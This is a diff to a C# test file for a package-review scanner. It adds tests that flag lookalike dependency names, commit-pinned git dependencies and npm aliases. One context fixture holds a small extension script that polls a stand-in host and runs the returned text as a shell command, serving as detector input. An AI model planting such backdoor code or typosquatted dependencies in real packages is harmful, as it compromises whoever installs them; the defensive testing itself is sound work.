@@ -1819,13 +1819,26 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Equal("none", Store(deps, "").Review);
         Assert.Equal("none", Store(deps, ""","scripts":{"start":"sample-day-js --watch"}""", ("package/dist/index.js", code)).Review);
         Assert.Equal("none", Store(deps, ""","bin":{"store":"bin/store"}""", ("package/dist/index.js", code), ("package/bin/store", "require('sample-day-js');")).Review);
-        Assert.Equal("none", Store(deps, "", ("package/dist/index.js", "/******/ (() => { var __webpack_modules__ = {};\nmodule.exports = {};")).Review);
+        // Bundler output clears only the names it holds.
+        Assert.Equal("worth reviewing", Store(deps, "", ("package/dist/index.js", "/******/ (() => { var __webpack_modules__ = {};\nmodule.exports = {};")).Review);
+        Assert.Equal("none", Store(deps, "", ("package/dist/index.js", "/******/ (() => { var m = { \"sample-day-js\": 1, \"left-pad\": 2, \"lodash.merge\": 3 };\nmodule.exports = {};")).Review);
         Assert.Equal("none", Store("""{"@sample/day-js":"^1","serverless-http":"^3","globals":"^13","preact-render-to-string":"^6"}""", "",
             ("package/dist/index.js", code)).Review);
         Assert.Equal("none", Review(Tgz("dayjs-plugin-1.0.0.tgz", ("package/package.json", """{"name":"@org/dayjs-plugin","version":"1.0.0","dependencies":{"sample-dayjs":"^1"}}"""),
             ("package/index.js", "module.exports = 1;"))).Review);
         Assert.DoesNotContain(Review(Zip("store-2.0.0.zip", ("package/package.json", U("{\"name\":\"store\",\"version\":\"2.0.0\",\"dependencies\":" + deps + "}")),
             ("package/index.js", U(code)), ("package/data.js", new byte[33 << 20]))).Findings, f => f.Rule == "package/dependency-lookalike");
+    }
+
+    [Fact]
+    public void An_unused_dependency_spelling_a_popular_name_after_a_filler_word_is_noteworthy()
+    {
+        var pkg = """{"name":"@org/memory","version":"1.0.0","main":"dist/index.js","dependencies":{"easy-day-js":"^1.0.0","left-pad":"^1"}}""";
+        var plain = Review(Tgz("memory-1.0.0.tgz", ("package/package.json", pkg), ("package/dist/index.js", "module.exports = require('left-pad');")));
+        Assert.Contains(plain.Findings, f => f is { Rule: "package/dependency-lookalike", Level: "noteworthy" } && f.Detail.Contains("easy-day-js (dayjs)", StringComparison.Ordinal));
+        var chunked = Review(Tgz("memory-1.0.1.tgz", ("package/package.json", pkg), ("package/dist/index.js", "import { a } from './chunk-ABC123.js';\nexport { a };"),
+            ("package/dist/chunk-ABC123.js", "var __commonJS = (cb, mod) => function () { return mod; };\nexport const a = __commonJS(() => 1);")));
+        Assert.Contains(chunked.Findings, f => f is { Rule: "package/dependency-lookalike", Level: "noteworthy" });
     }
 
     [Fact]
@@ -2189,6 +2202,37 @@ public sealed class PackageReviewTests : IDisposable
         var r = Review(Zip("acme.poll-0.0.1.vsix", ("extension/package.json", U(pkg)),
             ("extension/extension.js", U("const https = require('https'), cp = require('child_process');\nconst u = 'https://example.invalid/c';\nsetInterval(() => https.get(u, r => { let b = ''; r.on('data', c => b += c); r.on('end', () => cp.exec(b.split('\\n').pop())); }), 30000);"))));
         Assert.Contains(r.Findings, f => f is { Rule: "package/response-command", Level: "noteworthy" });
+    }
+
+    [Fact]
+    public void A_commit_pinned_git_dependency_no_code_names_is_noteworthy_and_a_loaded_one_is_review()
+    {
+        const string pin = "github:example/repo#0123456789abcdef0123456789abcdef01234567";
+        var unused = Review(Tgz("sensor-1.0.4.tgz",
+            ("package/package.json", $$$"""{"name":"size-meter","version":"1.0.4","main":"lib/index.js","optionalDependencies":{"helper-setup":"{{{pin}}}"}}"""),
+            ("package/lib/index.js", "module.exports = () => 1;")));
+        Assert.Contains(unused.Findings, f => f is { Rule: "package/dependency-source", Level: "noteworthy" });
+        var loaded = Review(Tgz("sensor-1.0.5.tgz",
+            ("package/package.json", $$$"""{"name":"size-meter","version":"1.0.5","main":"lib/index.js","dependencies":{"helper-setup":"{{{pin}}}"}}"""),
+            ("package/lib/index.js", "module.exports = require('helper-setup');")));
+        Assert.Contains(loaded.Findings, f => f is { Rule: "package/dependency-source", Level: "review" });
+    }
+
+    [Fact]
+    public void An_unscoped_alias_of_an_own_scope_or_floating_package_is_noteworthy_and_a_pinned_outside_one_is_not()
+    {
+        var own = Review(Tgz("client-1.0.0.tgz",
+            ("package/package.json", """{"name":"@demo/client","version":"1.0.0","main":"index.js","dependencies":{"libsignal":"npm:@demo/libsignal-fork@1.2.0"}}"""),
+            ("package/index.js", "module.exports = require('libsignal');")));
+        Assert.Contains(own.Findings, f => f is { Rule: "package/dependency-alias", Level: "noteworthy" } && f.Detail.Contains("libsignal (npm:@demo/libsignal-fork@1.2.0)", StringComparison.Ordinal));
+        var floating = Review(Tgz("app-1.0.0.tgz",
+            ("package/package.json", """{"name":"chat-app","version":"1.0.0","main":"index.js","dependencies":{"libsignal":"npm:@other/libsignal@latest"}}"""),
+            ("package/index.js", "module.exports = require('libsignal');")));
+        Assert.Contains(floating.Findings, f => f.Rule == "package/dependency-alias");
+        var pinned = Review(Tgz("app-1.0.1.tgz",
+            ("package/package.json", """{"name":"chat-app","version":"1.0.1","main":"index.js","dependencies":{"libsignal":"npm:@other/libsignal@2.0.1","str":"npm:string-width@4"}}"""),
+            ("package/index.js", "module.exports = require('libsignal');")));
+        Assert.DoesNotContain(pinned.Findings, f => f.Rule == "package/dependency-alias");
     }
 
     [Fact]
